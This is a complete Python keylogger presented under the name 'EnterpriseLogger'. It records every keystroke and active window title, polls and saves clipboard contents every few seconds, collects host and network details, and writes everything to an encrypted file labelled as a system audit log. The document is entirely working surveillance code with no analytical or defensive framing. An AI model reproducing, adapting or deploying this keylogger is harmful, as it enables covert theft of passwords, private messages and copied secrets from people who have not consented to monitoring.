import logging
import os
import platform
import socket
import threading
import time
import ctypes
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet
import pyperclip 
from ctypes import windll, create_unicode_buffer 

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "system_audit.enc")
KEY_FILE = "audit.key"
CLIPBOARD_MONITOR = True

class EnterpriseLogger:
    def __init__(self):
        self.current_window = None
        self.key = None
        self.cipher = None
        
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)
            
        self.setup_encryption()

    def setup_encryption(self):
        if not os.path.exists(KEY_FILE):
            self.key = Fernet.generate_key()
            with open(KEY_FILE, "wb") as kf:
                kf.write(self.key)
        else:
            with open(KEY_FILE, "rb") as kf:
                self.key = kf.read()

        self.cipher = Fernet(self.key)

    def get_system_info(self):
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        plat = platform.platform()
        processor = platform.processor()
        
        system_info = f"""
        [SYSTEM AUDIT STARTED]
        ----------------------
        Timestamp: {datetime.now()}
        Hostname : {hostname}
        IP Addr  : {ip_addr}
        OS       : {plat}
        Processor: {processor}
        ----------------------
        """
        self.append_to_log(system_info)

    def get_active_window(self):
        try:
            hwnd = windll.user32.GetForegroundWindow()
            length = windll.user32.GetWindowTextLengthW(hwnd)
            buf = create_unicode_buffer(length + 1)
            windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        except Exception:
            return "Unknown Window"

    def append_to_log(self, text):
        try:
            if len(text) > 1: 
                entry = f"\n[{datetime.now().strftime('%H:%M:%S')}] {text}"
            else:
                entry = text

            encrypted_entry = self.cipher.encrypt(entry.encode())
            
            with open(LOG_FILE, "ab") as f:
                f.write(encrypted_entry + b"\n")
        except Exception as e:
            print(f"[!] Write Error: {e}")

    def on_press(self, key):
        try:
            new_window = self.get_active_window()
            if new_window != self.current_window:
                self.current_window = new_window
                self.append_to_log(f"\n[WINDOW CHANGE: {self.current_window}]\n")

            try:
                if hasattr(key, 'char'):
                    self.append_to_log(key.char)
                else:
                    self.append_to_log(f"[{key.name.upper()}]")
            except Exception:
                pass

        except Exception as e:
            print(f"[!] Key Error: {e}")

    def monitor_clipboard(self):
        last_paste = ""
        while True:
            try:
                curr_paste = pyperclip.paste()
                if curr_paste != last_paste and len(curr_paste) > 0:
                    last_paste = curr_paste
                    self.append_to_log(f"\n[CLIPBOARD CAPTURE]: {curr_paste}\n")
            except:
                pass
            time.sleep(3)

    def start(self):
        print("[*] Enterprise Logger Initiated...")
        print(f"[*] Encryption: AES-128 (Fernet)")
        print(f"[*] Log File: {LOG_FILE}")
        
        self.get_system_info()
        
        if CLIPBOARD_MONITOR:
            clip_thread = threading.Thread(target=self.monitor_clipboard)
            clip_thread.daemon = True
            clip_thread.start()
            print("[*] Clipboard Monitor: ACTIVE")

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    app = EnterpriseLogger()
    app.start()
